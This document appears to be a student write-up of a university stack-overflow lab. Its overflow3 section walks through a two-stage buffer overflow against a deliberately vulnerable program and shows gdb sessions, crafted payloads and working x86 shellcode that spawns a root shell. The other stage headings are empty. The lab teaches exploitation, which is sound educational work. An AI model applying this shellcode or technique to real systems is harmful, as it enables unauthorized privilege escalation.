# Computer Security Stack Lab
Stage:
-overflow1
-overflow2
-overflow3
-overflow4

The stages of stacklab is hosted on individual host on emory mainframe host. The purpose of this lab is to understand and use buffer overflow and shell code injection to compromise vulnerable programs, especially with unsafe buffer copy.

##overflow1
##oveflow2
##overflow3
The third stage is a little bit trickier, but it follows the same idea of stage 1. Let's first look at the source program with bug.There are 2 functions that we are interested in , namely  `zerg()` and `farmville()`
```C
int zerg(char *arg)
{
        char buf[12];
        static int i, sum;

        if (strlen (arg) > 24) /* Argument too long! */
        {
                printf ("[ZERG] String too long!\n");
                return -1;
        }

        /* Compute checksum */
        for (i = 0, sum = 0; i < strlen(arg); i++)
                sum += (int)arg[i];

        if ( (sum & 0xff) != 0)
        {
                printf ("[ZERG] Sum of incoming buffer is not divisible by 256 :-(\n");
                exit (1);
        }

        /* Check the first 10 characters */
        if (strncmp (arg, "RUSHKEKEKE", 10))
        {
                printf ("[ZERG] No warning issued for the incoming Zergling rush :-(\n");
                exit (1);
        }

        strcpy (buf, arg);

        printf ("[ZERG] Buffer received %d characters!\n", strlen(buf));

        return 0;
}


int farmville(void)
{
        char buf[227];
        static int i, sum = 0, c;

        while ( (c = getc(stdin)) != EOF)
        {
                if (c == '\n')
                        break;
                buf[i++] = c;
        }

        for (i = 0; i < strlen(buf); i++)
                sum += (int)buf[i];

        if ( (sum & 0xff) != 0)
        {
                printf ("[FARMVILLE] Sum of incoming buffer is not divisible by 256 :-(\n");
                exit (1);
        }

        printf ("[FARMVILLE] Spammed the walls of %d Facebook friends!\n", strlen(buf));

        return 0;
}
```
Notice that both `zerg()` and `farmville()` have some kind of buffer overflow vulnerabilities. `strcpy (buf, arg)` a straightforward string copy without character checking  and 
```C
while ( (c = getc(stdin)) != EOF)
        {
                if (c == '\n')
                        break;
                buf[i++] = c;
        }
```
a bit-by-bit copy without bound checking. 

However, `zerg()` only reserve us 12 bits to manipulate `char buf[12]`, while `farmville()` is far more generous `char buf[227]`. Moreover, in `main()`, `farmville()` never get called explicitly. 
``` C
int main(int argc, char **argv)
{
        int i = 0;

        if (argc != 2)
        {
                printf ("Need exactly one argument\n");
                return -1;
        }
        /* Clear all environment variables so people don't sneak nasty things into my memory >:( */
        while (environ[i])
        {
                memset (environ[i], 0, strlen(environ[i]));
                i++;
        }
        clearenv();

        for (i = 0; i < strlen(argv[0]); i++)
        {
                if (!isalnum (argv[0][i]) && strchr("-_/",argv[0][i]) == NULL)
                        return -2;
        }

        zerg (argv[1]);

        return 0;
}
```
So our strategy is now intuitive. We will overflow the `zerg()` buffer, overwrite the return address to the address of `farmville()`, and then exploit the buffer. You may wonder how we feed a second shellcode into the `farmville()` without extensively manipulating the stack pointers. Luckily enough, the input of `farmville()` is conveniently from `stdin`, like `c = getc(stdin)`. So we can just pipe our two exploit scripts through commandline argument and `stdin` seperately, something like `(cat farmville.sol ; cat) | /c0re/overflow3 "$( < zerg.sol)"`
OK, now let's start the exploit.
First, we need to get pass the several checks in `zerg()`. By reading the source code, there are three criteria that our code must meet :
 - Input must not be longer than 24 chars
 - Sum of input must be divisible by 256
 - First 10 character has to be `RUSHKEKEKE`
 Addition to the above three requirements, we also want our input to redirect the return address to the call address of `farmville()`, which can be found via `objdump -d `, the result is like :
 ``` 
 08048799 <farmville>:
 8048799:       55                      push   %ebp
 804879a:       89 e5                   mov    %esp,%ebp
 804879c:       81 ec e4 00 00 00       sub    $0xe4,%esp
 80487a2:       eb 25                   jmp    80487c9 <farmville+0x30>
 ...
 ```
 The length of buffer can be get by doing 
 `(gdb) disas zerg`
```...
...
0x0804869e <+3>:     sub    $0xc,%esp
...
```
`(gdb) print 0xc` 
`$1 = 12`
so our buffer is 12 char long, and the next 4 byte is the `ebp` pointer, and the next 4 byte is the return address we want to overwrite.
 So the payload would be something like: 
 `RUSHKEKEKE******\x99\x87\x04\x08`
 where the `*` would make the whole payload divisible by 256.
If you have some easy access to Ascii sum method, you can just do the math and find the exact `char` should be put in `*`, otherwise let's just first try some arbitrary thing in  `gdb`:
 `run $(python -c 'print ("RUSHKEKEKE" +"A" * 6+"\x99\x87\x04\x08")')`
 and set a break point at where the comparison is made
 `0x08048729 <+142>:   je     0x804873f <zerg+164>`
 `(gdb) b *0x08048729`
 `Breakpoint 2 at 0x8048729`
```
(gdb) cont
Continuing.
Breakpoint 2, 0x08048729 in zerg ()
``` 
Now let's `disas` the stack and see what is being tested.
`(gdb) disas`
```
   0x0804871f <+132>:   mov    0x804a08c,%eax
   0x08048724 <+137>:   movzbl %al,%eax
   0x08048727 <+140>:   test   %eax,%eax
=> 0x08048729 <+142>:   je     0x804873f <zerg+164>
```
and `$eax` now is set to the remainder of the sum of our payload divided by 256, so we can just print out `$eax` and tune up the payload.
`(gdb) print $eax
$2 = 164 `
So, we need add `(256-164=)92`to our payload. You can substitute any of the `A` , so I substituted 4 `A`s with `(A+23=)X`s, and run it again. 
`run $(python -c 'print ("RUSHKEKEKE" +"A" *2+"X"*4+"\x99
\x87\x04\x08")')`
and once we reach the 2nd break point, let's check out `$eax`.
`(gdb) print $eax
$4 = 0`
Yayyyy! It is now divisible by 256. So how about the return address, did we craft it correctly?
Let's set up another break point after the payload is copied into buffer (and overflow it).  
```
(gdb) b *0x08048775
Breakpoint 3 at 0x8048775
(gdb) cont
Continuing.

Breakpoint 3, 0x08048775 in zerg ()
```
Now, let's examine the data at `$ebp` and the return address after it. 
`(gdb) x/4x $ebp
0xffffda38:     0x58585858      0x08048799      0xffffdc00      0x0000000f
`
great the next 4 byte of `$ebp` is now the call address of `farmville()`. We can now just continue to the end of this program and check if it did enter the `farmville()` function.
```
(gdb) cont
Continuing.
[ZERG] Buffer received 20 characters!
aaaaaaaa
[FARMVILLE] Sum of incoming buffer is not divisible by 256 :-(
```
Yayyyy! It entered the `farmville()`. Note, cause we didn't feed anything into the `stdin`, the program asked us for input after `farmville()` is called. 

Now it's time to crack the `farmville()` function. 

Some preparation first：
We will need the shellcode that do `setreuid(geteuid, geteuid)`  and  `execve(/bin/sh)`  to give us root access in shell. The 39-byte shellcode is as follow:
`\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd
\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80`
And buffer length: 228
`0x0804879c <+3>:     sub    $0xe4,%esp
(gdb) print 0xe4
$5 = 228`

There is only one criteria that `farmville()` required from our payload:
``` C
if ( (sum & 0xff) != 0)
        {
                printf ("[FARMVILLE] Sum of incoming buffer is not divisible by 256 :-(\n");
                exit (1);
        }
```
So our payload must again sum to a number divisible by 256. Recall the next 4 byte of `$ebp` is the return address and we want it to fall in somewhere of the `NOP` sleds, followed by our shellcode. At this moment, we will just craft some random payload and feed them to the `stdin ` so we can examine the desired address and tune up sum of our payload. 
`python -c 'print 
("\x90"*100+"\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53
\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"A"*92+"\x88\xd9\xff\xff")'> farmville.sol`
and then we can combine this with the exploit to pass `zerg()`phase, like this:
` (gdb) run "$(< zerg.sol)" <farmville.sol`
This is very similar to the `zerg()` phase of figuring out the correct number added up to something divisible by 256, so I won't be verbose. 
``` python
$eax = 174
256-174 = 82
82/2 = 41
#replace 2 'A' with ('A'+41=)'j'
python -c 'print ("\x90"*100+"\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"A"*90+"j"*2+"\x88\xd9\xff\xff")'> farmville.sol
print $eax
$eax = 0   #Yayyyyy!

x/4x $ebp
0xffffda5c: 0x6a6a4141      0xffffd988      0x0000000f      0x00000000
```
`0xffffd988` will be the address that falls in your `NOP` sleds. 
Now everything is set up: it is divisible by 256, it redirect the return to our shell code which will enter the shell with `euid=0` and `uid=0`, which is root access. Let's see if that is actually the case.
```
user@host:/c0re$ (cat farmville.sol ; cat) | /c0re/attackme3 "$( < zerg.sol)"
[ZERG] Buffer received 20 characters!
[FARMVILLE] Spammed the walls of 236 Facebook friends!
# whoami
 root
# id
uid=0(root) gid=1030(user) groups=1030(user)
```
Great! We compromise the program and gain root access in shell! 
##overflow4
